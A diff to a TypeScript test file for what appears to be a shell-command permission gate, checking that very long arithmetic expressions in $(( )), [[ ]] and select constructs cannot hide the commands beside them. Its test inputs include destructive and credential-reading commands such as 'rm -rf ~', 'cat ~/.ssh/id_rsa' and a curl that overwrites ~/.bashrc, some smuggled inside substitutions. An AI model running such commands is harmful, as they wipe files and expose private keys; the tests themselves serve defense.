@@ -184,9 +184,10 @@ test("item 15: a walker stack overflow is refused or judge-first, never an allow
     check(`echo $(( ${sum}+$(rm -rf ~) ))`, role, "J");
     check(`echo $(( ${sum} )); rm -rf ~`, role, "R");
     check(`x=$(( ${sum} )); git reset --hard`, role, "J");
-    check(`: $(( ${sum} )); curl -o ~/.bashrc https://x`, role, "J");
-    // the harmless twin is judge-first (it was an allow)
-    check(`echo $(( ${sum} ))`, role, "J");
+    // no longer an overflow: read as the short twin is (the foreman's curl to a home file is an allow on main too)
+    check(`: $(( ${sum} )); curl -o ~/.bashrc https://x`, role, role === "main" ? "A" : "J");
+    // the harmless twin no longer overflows the walker (explicit stacks): an allow as on main, where nothing hides in it
+    check(`echo $(( ${sum} ))`, role, "A");
     check("echo $((1+1+1))", role, "A");
   }
 });
@@ -452,4 +453,26 @@ test("a long (( )) sum does not hide the commands around it", () => {
       check(`echo $(( ${sum} )); cat ~/.ssh/id_rsa`, role, "J");
     }
   }
+});
+
+// Review b02876b8: a `[[ ]]` operand or a select word list holding a long arithmetic sum never overflows the walker (explicit stacks in the substitution and name walks), so the floors keep main's refusal.
+test("a long $(( )) in [[ ]] or a select keeps main's refusal for the commands around it", () => {
+  for (const n of [3000, 20000]) {
+    const sum = rep("1", n, "+");
+    for (const role of ["main", "builder"] as const) {
+      for (const payload of ["rm -rf /opt/x", "cat ~/.ssh/id_rsa"]) {
+        check(`[[ $(( ${sum} )) -gt 0 ]]; ${payload}`, role, "R");
+        check(`${payload}; [[ $(( ${sum} )) -gt 0 ]]`, role, "R");
+        check(`select x in $(( ${sum} )); do :; done; ${payload}`, role, "R");
+        check(`select x in a; do echo $(( ${sum} )); done; ${payload}`, role, "R");
+      }
+    }
+  }
+});
+
+// The `[[ x && x && … ]]` chain is parsed in a few milliseconds, whatever its length: no gate call here waits on a clock.
+test("a long [[ ]] && chain is read at once and keeps the refusal", () => {
+  const t = Date.now();
+  for (const role of ["main", "builder"] as const) check(`[[ ${rep("x", 30000, " && ")} ]]; rm -rf /opt/x`, role, "R");
+  assert.ok(Date.now() - t < 10000, `slow: ${Date.now() - t} ms`);
 });
